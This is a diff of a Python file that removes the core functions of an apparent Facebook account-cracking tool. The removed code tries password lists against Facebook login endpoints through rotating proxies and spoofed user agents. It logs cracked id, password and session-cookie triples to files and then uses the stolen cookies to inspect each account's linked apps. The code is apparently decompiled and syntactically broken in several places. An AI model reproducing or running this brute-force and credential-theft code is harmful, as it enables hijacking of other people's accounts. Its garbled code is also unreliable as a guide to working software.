@@ -1340,145 +1340,7 @@ for xd in range(10000):
             back()
 
         
-        def crack(idf, pwv):
-            global ok, cp, loop
-            bo = random.choice([
-                m,
-                k,
-                h,
-                b,
-                u,
-                x])
-            (sys.stdout.write(f'''\r \x1b[37m[DEVI-RUNNING-M1] {loop}/{len(id)} OK[{H}{ok}\x1b[37m] [{'{:.0%}'.format(loop / float(len(id)))}]  '''),)
-            sys.stdout.flush()
-            ua = random.choice(ugen)
-            ua2 = random.choice(ugen2)
-            ses = requests.Session()
-            for pw in pwv:
-                nip = random.choice(prox)
-                proxs = {
-                    'http': 'socks4://' + nip }
-                link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=266003681172790&kid_directed_site=0&app_id=266003681172790&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D266003681172790%26redirect_uri%3Dhttps%253A%252F%252Fapp.heylink.me%252Flogin%252Ffacebook%26state%3Dfbloginheylinkme%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5327ef2a-17a4-41a6-ba33-aa8acdda0343%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapp.heylink.me%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfbloginheylinkme%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1702051010&hrc=1&wtsid=rdr_03CkC8hTBPuvnU7RM&_rdr')
-                data = {
-                    'bi_xrwh': 0 }
-                headers = {
-                    'upgrade-insecure-requests': '1',
-                    'user-agent': DEVI(),
-                    'viewport-width': '980' }
-                po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=266003681172790&auth_token=163217a672b552df614d575382df8cc6&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D266003681172790%26redirect_uri%3Dhttps%253A%252F%252Fapp.heylink.me%252Flogin%252Ffacebook%26state%3Dfbloginheylinkme%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5327ef2a-17a4-41a6-ba33-aa8acdda0343%26tp%3Dunspecified&refsrc=deprecated&app_id=266003681172790&cancel=https%3A%2F%2Fapp.heylink.me%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfbloginheylinkme%23_%3D_&lwv=100', data = data, headers = headers, allow_redirects = False, proxies = proxs)
-                if 'c_user' in ses.cookies.get_dict().keys():
-                    ok += 1
-                    coki = po.cookies.get_dict()
-                    koki = (lambda : for key, value in 0:
-[ f'''{key!s}={value!s}''' ])(ses.cookies.get_dict().items()())
-                    print(f'''\r{P}{H} [DEVI-OK] {H}{idf}|{pw}\n{P}[{H}Cookei]{P}\x1b[1;34m{kuki}''')
-                    open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
-                    cek_apk(kuki)
-                    open('/sdcard/DEVI-OK.txt', 'a').write(idf + ' | ' + pw + ' | ' + kuki + '\n')
-                    ';'.join
-                if 'checkpoint' in po.cookies.get_dict().keys():
-                    print(f'''\r{P}[{K}DEVI-CP{P}] {K}{idf}|{pw}''')
-                    open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
-                    open('/sdcard/DEVI-CP.txt', 'a').write(idf + ' | ' + pw + '\n')
-                    akun.append(idf + '|' + pw)
-                    cp += 1
-                    '?1'
-                if requests.exceptions.ConnectionError:
-                    'sec-fetch-user'
-                    time.sleep(31)
-                loop += 1
-                return None
-
         
-        def crackfree(idf, pwv):
-            global cp, ok, loop
-            (sys.stdout.write(f'''\r \x1b[37m[DEVI-RUNNING-M2] {loop}/{len(id)} OK[{H}{ok}\x1b[37m] [{'{:.0%}'.format(loop / float(len(id)))}]  '''),)
-            sys.stdout.flush()
-            ua = random.choice(ugen)
-            ua2 = random.choice(ugen2)
-            ses = requests.Session()
-            for pw in pwv:
-                ses.headers.update({
-                    'Host': 'm.facebook.com',
-                    'cache-control': 'max-age=0',
-                    'sec-ch-ua-mobile': '?1',
-                    'upgrade-insecure-requests': '1',
-                    'user-agent': ua,
-                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                    'dnt': '1',
-                    'x-requested-with': 'mark.via.gp',
-                    'sec-fetch-site': 'same-origin',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-dest': 'document',
-                    'referer': 'https://p.facebook.com/',
-                    'accept-encoding': 'gzip, deflate br',
-                    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' })
-                p = ses.get('https://free.facebook.com/login/device-based/validate-password/?shbl=0', data = dataa, cookies = {
-                    'cookie': koki }, headers = heade, allow_redirects = False, proxies = proxs)
-                dataa = {
-                    'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
-                    'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
-                    'uid': idf,
-                    'next': 'https://p.facebook.com/login/save-device/',
-                    'flow': 'login_no_pin',
-                    'pass': pw }
-                koki = (lambda : for key, value in 0:
-[ f'''{key!s}={value!s}''' ])(p.cookies.get_dict().items()())
-                koki += ' m_pixel_ratio=2.625; wd=412x756'
-                heade = 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
-                po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0', data = dataa, cookies = {
-                    'cookie': koki }, headers = heade, allow_redirects = False, proxies = proxs)
-                if 'checkpoint' in po.cookies.get_dict().keys():
-                    print(f'''\r{P}{K} [{time.strftime('DEVI')}-CP] {idf}  {pw} {P}''')
-                    open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
-                    akun.append(idf + '|' + pw)
-                    cp += 1
-                    'accept-language'
-                if 'c_user' in ses.cookies.get_dict().keys():
-                    ok += 1
-                    coki = po.cookies.get_dict()
-                    kuki = (lambda 0: for key, value in 0:
-[ f'''{key!s}={value!s}''' ])(ses.cookies.get_dict().items()())
-                    print(f'''\r{P}{H} [{time.strftime('DEVI')}-OK] {idf}  {pw} {P}''')
-                    cek_apk(kuki)
-                    open('/sdcard/DEVI-OK.txt', 'a').write(idf + ' | ' + pw + ' | ' + kuki + '\n')
-                    ok.append(wrt)
-                    ';'.join
-                if requests.exceptions.ConnectionError:
-                    'gzip, deflate, br'
-                    time.sleep(31)
-                loop += 1
-                return None
-
-        
-        def cek_apk(kuki):
-            session = requests.Session()
-            w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', cookies = {
-                'cookie': 'noscript=1;' + kuki }).text
-            sop = bs4.BeautifulSoup(w, 'html.parser')
-            x = sop.find('form', method = 'post')
-            game = x.find_all('h3')()
-            for i in range(len(game)):
-                print(f'''\r{P!s}  \x1b[0m {H!s}{game[i].replace('Added on', ' Added on')!s}''')
-                if AttributeError:
-                    (lambda : for i in 0:
-                    
-[ i.text ])
-                    print('\r    %s\x1b[0m cookie invalid' % M)
-            w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', cookies = {
-                'cookie': 'noscript=1;' + kuki }).text
-            sop = bs4.BeautifulSoup(w, 'html.parser')
-            x = sop.find('form', method = 'post')
-            game = x.find_all('h3')()
-            for i in range(len(game)):
-                print(f'''\r{P!s}  \x1b[0m {game[i].replace('Expired', ' Expired')!s}''')
-                return None
-                if AttributeError:
-                    (lambda : for i in 0:
-[ i.text ])
-                    print('\r    %s \x1b[0mcookie invalid' % M)
-                    return None
 
         if __name__ == '__main__':
             os.mkdir('OK')
@@ -1488,6 +1350,7 @@ for xd in range(10000):
             Mano_menu()
             return None
         return None
+
 
 
 
